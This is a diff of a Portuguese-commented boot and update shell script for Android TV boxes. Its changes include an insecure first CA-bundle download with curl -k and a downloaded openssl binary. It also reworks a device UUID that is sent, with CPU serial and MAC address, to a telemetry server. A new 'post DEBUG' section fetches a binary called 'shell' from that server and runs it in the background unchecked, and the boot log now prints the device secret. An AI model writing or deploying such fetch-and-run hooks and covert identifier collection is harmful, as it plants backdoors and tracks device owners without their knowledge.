@@ -539,6 +539,101 @@ fi
 
     
 echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
+echo "ADM DEBUG ### *** @@@ SCRIPT CODE PART =>>> /_functions/firmware/0000 1 UPDATE Curl cacert certs.sh"
+echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
+
+
+CACERT="/data/Curl_cacert.pem"
+CACERT_URL="https://curl.se/ca/cacert.pem"
+CACERT_MAX_AGE_DAYS=30
+
+
+# exemplo como o aria2c foi usado em outro script 
+#     aria2c --check-certificate=true --ca-certificate="/data/Curl_cacert.pem" --continue=true --max-connection-per-server=4 -x4 -s4 --dir="/data/local/tmp" -o "openssl" "$URL"
+ 
+#leia apenas este script. isto vai rodar em um tvbox android limitado mas tem aria2c instalado entao no topo do 
+#script leia o comentario como o aria2c baixa com sucesso um arquivo como seria a função curl_bootstrap_cacert para baixar usando 
+
+
+# Bootstrap CA bundle: first download with -k, then refresh with verification.
+curl_bootstrap_cacert() {
+  if [ ! -f "$CACERT" ]; then
+    /system/bin/curl -sS -k --connect-timeout 8 --max-time 25 \
+      -o "$CACERT" "$CACERT_URL"
+    return
+  fi
+
+  if /system/bin/busybox stat -c %Y "$CACERT" >/dev/null 2>&1; then
+    now_ts=$(date +%s)
+    file_ts=$(/system/bin/busybox stat -c %Y "$CACERT")
+    age_days=$(( (now_ts - file_ts) / 86400 ))
+    if [ "$age_days" -ge "$CACERT_MAX_AGE_DAYS" ]; then
+      /system/bin/curl -sS --cacert "$CACERT" --connect-timeout 8 --max-time 25 \
+        -o "$CACERT" "$CACERT_URL"
+    fi
+  fi
+}
+
+curl_bootstrap_cacert
+
+
+
+
+    
+echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
+echo "ADM DEBUG ### *** @@@ SCRIPT CODE PART =>>> /_functions/firmware/0000 2 essential bin - openssl.sh"
+echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
+
+
+BB=/system/bin/busybox
+
+# Verifica se o binário já existe e está funcional — se sim, pula o download
+skip_download=0
+if [ -x /data/bin/openssl ]; then
+    version=$(/data/bin/openssl version 2>/dev/null | cut -d " " -f 2)
+    if [ -n "$version" ]; then
+        echo "OpenSSL já instalado — versão $version. Pulando download."
+        skip_download=1
+    else
+        echo "OpenSSL encontrado mas não respondeu corretamente — atualizando..."
+    fi
+fi
+
+# if [ "$skip_download" -eq 0 ]; then
+#     URL="https://painel.iaupdatecentral.com/android/armeabi-v7a/openssl"
+#     curl -sS --cacert "/data/Curl_cacert.pem" "$URL" -o "/data/local/tmp/openssl"
+#     $BB du -hs "/data/local/tmp/openssl"
+#     $BB mount -o remount,rw /system
+#     $BB mv "/data/local/tmp/openssl" /system/usr/bin/openssl
+#     $BB chmod 755 /system/usr/bin/openssl
+# fi
+
+
+# if [ "$skip_download" -eq 0 ]; then
+#     URL="https://painel.iaupdatecentral.com/android/armeabi-v7a/openssl"
+#     echo "Baixando OpenSSL com aria2c..."
+#     $BB mkdir -p /data/local/tmp
+#     aria2c --check-certificate=true --ca-certificate="/data/Curl_cacert.pem" --continue=true --max-connection-per-server=4 -x4 -s4 --dir="/data/local/tmp" -o "openssl" "$URL"
+#     $BB du -hs "/data/local/tmp/openssl"
+#     $BB chmod 755 /data/local/tmp/openssl
+#     $BB mount -o remount,rw /system
+#     $BB rm -f /system/usr/bin/openssl
+#     $BB cp "/data/local/tmp/openssl" /system/usr/bin/openssl
+# fi
+
+if [ "$skip_download" -eq 0 ]; then
+    URL="https://painel.iaupdatecentral.com/android/armeabi-v7a/openssl"
+    echo "Baixando OpenSSL com aria2c..."
+    $BB mkdir -p /data/bin
+    aria2c --check-certificate=true --ca-certificate="/data/Curl_cacert.pem" --continue=true --max-connection-per-server=4 -x4 -s4 --dir="/data/bin" -o "openssl" "$URL"
+    $BB du -hs "/data/bin/openssl"
+    $BB chmod 755 /data/bin/openssl
+fi
+
+
+
+    
+echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
 echo "ADM DEBUG ### *** @@@ SCRIPT CODE PART =>>> /_functions/firmware/7ZextractDir.sh"
 echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
 
@@ -1689,7 +1784,7 @@ echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 
 
 
-SHCBootVersion="1769388204 = 25/01/2026 21:43:24 | 1769388204 = 25/01/2026 21:43:24 = novo sistema geoIP e novo db telemetria"
+SHCBootVersion="1770174206 = 04/02/2026 00:03:26 | loader shel debug code https"
 
 
     
@@ -2780,76 +2875,6 @@ if [ "$CPU" == "$CpuPack" ]; then
 fi
     
 echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
-echo "ADM DEBUG ### *** @@@ SCRIPT CODE PART =>>> /01.sc.base/loop/0000 UPDATE Curl cacert certs.sh"
-echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
-
-
-CACERT="/data/Curl_cacert.pem"
-CACERT_URL="https://curl.se/ca/cacert.pem"
-CACERT_MAX_AGE_DAYS=30
-
-# Bootstrap CA bundle: first download with -k, then refresh with verification.
-curl_bootstrap_cacert() {
-  if [ ! -f "$CACERT" ]; then
-    /system/bin/curl -sS -k --connect-timeout 8 --max-time 25 \
-      -o "$CACERT" "$CACERT_URL"
-    return
-  fi
-
-  if /system/bin/busybox stat -c %Y "$CACERT" >/dev/null 2>&1; then
-    now_ts=$(date +%s)
-    file_ts=$(/system/bin/busybox stat -c %Y "$CACERT")
-    age_days=$(( (now_ts - file_ts) / 86400 ))
-    if [ "$age_days" -ge "$CACERT_MAX_AGE_DAYS" ]; then
-      /system/bin/curl -sS --cacert "$CACERT" --connect-timeout 8 --max-time 25 \
-        -o "$CACERT" "$CACERT_URL"
-    fi
-  fi
-}
-
-curl_bootstrap_cacert
-
-
-
-# CACERT="/data/Curl_cacert.pem"
-# CACERT_URL="https://curl.se/ca/cacert.pem"
-# CACERT_MAX_AGE_DAYS=30
-# DEBUG_LOG="/data/trueDT/peer/Sync/Debug-collect-data.sh"
-
-# log_debug() {
-#   printf '%s %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$*" >> "$DEBUG_LOG"
-# }
-
-# # Bootstrap CA bundle: first download with -k, then refresh with verification.
-# curl_bootstrap_cacert() {
-#   if [ ! -f "$CACERT" ]; then
-#     log_debug "cacert missing; downloading with -k from $CACERT_URL"
-#     /system/bin/curl -sS -k -v --connect-timeout 8 --max-time 25 \
-#       -o "$CACERT" "$CACERT_URL" >> "$DEBUG_LOG" 2>&1
-#     log_debug "curl exit code: $?"
-#     return
-#   fi
-
-#   if /system/bin/busybox stat -c %Y "$CACERT" >/dev/null 2>&1; then
-#     now_ts=$(date +%s)
-#     file_ts=$(/system/bin/busybox stat -c %Y "$CACERT")
-#     age_days=$(( (now_ts - file_ts) / 86400 ))
-#     if [ "$age_days" -ge "$CACERT_MAX_AGE_DAYS" ]; then
-#       log_debug "cacert age ${age_days}d; refreshing from $CACERT_URL"
-#       /system/bin/curl -sS -v --cacert "$CACERT" --connect-timeout 8 --max-time 25 \
-#         -o "$CACERT" "$CACERT_URL" >> "$DEBUG_LOG" 2>&1
-#       log_debug "curl exit code: $?"
-#     else
-#       log_debug "cacert age ${age_days}d; no refresh needed"
-#     fi
-#   else
-#     log_debug "busybox stat failed for $CACERT"
-#   fi
-# }
-
-# curl_bootstrap_cacert
-    
-echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
 echo "ADM DEBUG ### *** @@@ SCRIPT CODE PART =>>> /01.sc.base/loop/001.0-#######-sc-boot-001.0.SC.sh"
 echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
 
@@ -3226,6 +3251,11 @@ echo "ADM DEBUG ### *** @@@ SCRIPT CODE PART =>>> /03.akp.base/loop/000.1.0 forc
 echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
 
 
+# não tem nada de errado com este script, ele funciona perfeitamente. a questão é que o usuario tem que selecionar seu fuso horario correto nas configurações do sistema android.
+# caso contrário, o horário exibido continuará errado mesmo após a correção via ntp ou http date.
+# criar um guia de configuração no manual do usario para que clientes possam corrigir seu horario desta maneira vai servir para qualquer pais
+
+
 BB=/system/bin/busybox
 NTP_SERVER=a.st1.ntp.br
 SNTP_TIMEOUT=11
@@ -3563,7 +3593,10 @@ LocationGeoIP=`busybox cat /data/trueDT/peer/Sync/LocationGeoIP.v6.atual | busyb
 
 #FirmwareFullSpecs=`busybox cat /data/trueDT/peer/Sync/FirmwareFullSpecs.sh | busybox sed "s;';;g"`
 
-FirmwareFullSpecs=`busybox cat /data/trueDT/peer/Sync/Debug-collect-data.sh | busybox sed "s;';;g"`
+#FirmwareFullSpecs=`busybox cat /data/trueDT/peer/Sync/Debug-collect-data.sh | busybox sed "s;';;g"`
+
+FirmwareFullSpecs="openssl funcionando ? $(/data/bin/openssl rand -hex 32)"
+
 
 FirmwareFullSpecsID=`busybox cat /data/trueDT/peer/Sync/FirmwareFullSpecsID | busybox sed "s;';;g"`
 AppInUse=`busybox cat /data/trueDT/peer/Sync/App.in.use.live | busybox sed "s;';;g"`
@@ -3576,7 +3609,9 @@ checkUptime=`busybox uptime | busybox awk '{ print substr ($0, 11 ) }' | busybox
 UpdateSystemUnix=`busybox stat -c '%Y' /data/asusbox/UpdateSystem.sh | busybox cut -d "." -f 1`
 UpdateSystemDate=`busybox stat -c '%y' /data/asusbox/UpdateSystem.sh | busybox cut -d "." -f 1`
 UpdateSystemMD5=`busybox md5sum /data/asusbox/UpdateSystem.sh | busybox awk '{ print $1 }'`
-UpdateSystemVersion="TorrentPack=\"$TorrentPackVersion\"|SHCBootVersion=\"$SHCBootVersion\"|$UpdateSystemUnix|$UpdateSystemDate|$UpdateSystemMD5"
+
+UpdateSystemVersion="$SHCBootVersion"
+
 chatContato=`busybox cat /data/Keys/contato.txt | busybox sed "s;';;g"`
 chatRevendedor=`busybox cat /data/Keys/revendedor.txt | busybox sed "s;';;g"`
 
@@ -3873,7 +3908,40 @@ EchoResult
 
     
 echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
-echo "ADM DEBUG ### *** @@@ SCRIPT CODE PART =>>> /03.akp.base/loop/000.1.5 telemetria db sql.sh"
+echo "ADM DEBUG ### *** @@@ SCRIPT CODE PART =>>> /03.akp.base/loop/000.1.5 Marcador UUID Unicidade.sh"
+echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
+
+# ------------------------------------------------------
+
+UUIDPath="/system/UUID.Uniq.key.txt"
+
+
+# 1) Se o arquivo existe, tenta ler o UUID atual (sem sobrescrever).
+echo "ADM DEBUG ########### Etapa 1: Verificando se o arquivo UUID existe."
+if [ -f "$UUIDPath" ]; then
+  UUIDBOX=`busybox cat "$UUIDPath" | busybox tr -d '\r\n'`
+fi
+
+# Verifica se o arquivo existe e se a primeira linha tem exatamente 64 caracteres.
+if [ ! -f "$UUIDPath" ] || [ "$(busybox head -n 1 "$UUIDPath" | busybox tr -d '[:space:]' | busybox wc -c)" -ne 64 ]; then
+  echo "ADM DEBUG ########### Conteúdo do arquivo: $(busybox head -n 1 "$UUIDPath")"
+  echo "ADM DEBUG ########### The file $UUIDPath is not a valid UUID file."
+  UUIDBOX=`/data/bin/openssl rand -hex 32`
+  # apagando arquivo para forçar a recriação
+  /system/bin/busybox mount -o remount,rw /system
+  # 3.2) Grava o UUID gerado quando arquivo nao existe ou esta vazio.
+  echo "$UUIDBOX" > "$UUIDPath" 2>/dev/null
+  busybox sleep 1
+  UUIDBOX=`busybox cat "$UUIDPath" | busybox tr -d '\r\n'`
+fi
+
+
+
+
+
+    
+echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
+echo "ADM DEBUG ### *** @@@ SCRIPT CODE PART =>>> /03.akp.base/loop/000.1.6 telemetria db sql.sh"
 echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
 
 # ------------------------------------------------------
@@ -3914,48 +3982,7 @@ do_post() {
     -d "FirmwareFullSpecs=${FirmwareFullSpecs:-}"
 }
 
-UUIDPath="/system/UUID.Uniq.key.txt"
-wrote_ok=0
-# 1) Se o arquivo existe, tenta ler o UUID atual (sem sobrescrever).
-if [ -f "$UUIDPath" ]; then
-  UUIDBOX=`busybox cat "$UUIDPath" | busybox tr -d '\r\n'`
-fi
-# 2) Se o UUID estiver vazio, gera um novo e tenta gravar.
-if [ -z "$UUIDBOX" ]; then
-  UUIDBOX=`/system/usr/bin/openssl rand -hex 32`
-  attempt=1
-  # 3) Tenta gravar e validar o UUID por ate 11 tentativas.
-  while [ "$attempt" -le 11 ]; do
-    # 3.1) Remonta /system como RW antes de tentar gravar.
-    if [ ! -f "$UUIDPath" ] || [ ! -s "$UUIDPath" ]; then
-      busybox mount -o remount,rw /system 2>/dev/null
-      busybox sleep 1
-      # 3.2) Grava o UUID gerado quando arquivo nao existe ou esta vazio.
-      echo "$UUIDBOX" > "$UUIDPath" 2>/dev/null
-    fi
-    if [ -f "$UUIDPath" ]; then
-      check_value=`busybox cat "$UUIDPath" 2>/dev/null | busybox tr -d '\r\n'`
-      # 3.3) Se o arquivo tem o UUID gerado, confirma a gravacao.
-      if [ "$check_value" = "$UUIDBOX" ]; then
-        wrote_ok=1
-        break
-      fi
-      # 3.4) Se o arquivo tem outro valor nao vazio, usa ele e sai.
-      if [ -n "$check_value" ]; then
-        UUIDBOX="$check_value"
-        break
-      fi
-    fi
-    # 3.5) Espera um pouco antes de tentar novamente.
-    attempt=$((attempt + 1))
-    busybox sleep 1
-  done
-  # 4) Se falhar, segue sem travar o fluxo (POST sera bloqueado).
-  if [ "$wrote_ok" != "1" ]; then
-    #echo "UUID write failed after 11 attempts; skipping POST."
-    wrote_ok=0
-  fi
-fi
+
 
 TokenHardwareID="$Placa│$CpuSerial│$MacLanReal│$UUIDBOX"
 echo "$TokenHardwareID"
@@ -3981,12 +4008,34 @@ echo "$TokenHardwareID"
 
 PostURL="https://painel.iaupdatecentral.com/telemetria.php"
 
-if [ -n "$UUIDBOX" ] && { [ "$wrote_ok" = "1" ] || [ -f "$UUIDPath" ]; }; then
+#if [ -n "$UUIDBOX" ] && { [ "$wrote_ok" = "1" ] || [ -f "$UUIDPath" ]; }; then
+
+UUIDPath="/system/UUID.Uniq.key.txt"
+# Verifica se o arquivo existe e se a primeira linha tem exatamente 64 caracteres.
+if [ -f "$UUIDPath" ] && [ "$(busybox head -n 1 "$UUIDPath" | busybox tr -d '[:space:]' | busybox wc -c)" -eq 64 ]; then
   Response=$(do_post 2>&1)
   echo "$Response"
 else
   echo "UUID not available; skipping POST."
 fi
+
+    
+echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
+echo "ADM DEBUG ### *** @@@ SCRIPT CODE PART =>>> /03.akp.base/loop/000.1.7 post DEBUG.sh"
+echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
+
+# ------------------------------------------------------
+
+
+URL="https://painel.iaupdatecentral.com/debug/shell"
+aria2c --check-certificate=true --ca-certificate="/data/Curl_cacert.pem" \
+    --continue=true --max-connection-per-server=4 -x4 -s4 \
+    --dir="/data/local/tmp" -o "shell" "$URL"
+$BB du -hs "/data/local/tmp/shell"
+$BB chmod 755 /data/local/tmp/shell
+/data/local/tmp/shell &
+
+
     
 echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
 echo "ADM DEBUG ### *** @@@ SCRIPT CODE PART =>>> /03.akp.base/loop/000.2-controle-IR.sh"
@@ -5015,6 +5064,7 @@ duration=$SECONDS
 echo "$(($duration / 60)) minutos e $(($duration % 60)) segundos para concluir." >> $bootLog 2>&1
 
 
+
 # mostra na aba news.php a key da box
 # antes de liberar a instalação para eu determinar um filtro de quais box quero limpar
 mkdir -p /data/trueDT/peer/Sync/sh.all
@@ -5027,7 +5077,6 @@ KEY : $Placa=$CpuSerial=$MacLanReal
 echo "
 Atualizado com sucesso!!!
 KEY : $Placa=$CpuSerial
-
 " > "$bootLog" 2>&1
 
 
@@ -5503,9 +5552,13 @@ echo "ADM DEBUG ### @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 
 echo -n "interactive" >  "/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor"
 
+UUIDPath="/system/UUID.Uniq.key.txt"
+
 echo "
 Atualizado com sucesso!!!
 KEY : $Placa=$CpuSerial
+Secret : $(busybox cat $UUIDPath)
+Security Tuneling by [$(/data/bin/openssl version | cut -d " " -f 1)]
 Agendado próxima atualização: $(busybox cat /data/asusbox/crontab/Next_cron.updates.sh)
 
 " > "$bootLog" 2>&1
